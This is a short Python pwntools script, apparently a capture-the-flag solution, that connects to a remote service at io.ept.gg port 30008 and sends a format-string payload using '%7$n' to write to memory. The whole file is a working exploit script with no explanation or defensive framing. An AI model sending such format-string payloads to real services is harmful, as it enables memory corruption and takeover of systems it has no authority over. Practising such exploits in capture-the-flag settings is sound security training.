#!/usr/bin/env python3
from pwn import *

#r=process("./fms")
r=remote("io.ept.gg",30008)
print(r.recv())
buf = b"11%7$n11"
r.sendline(buf)
print(r.recv())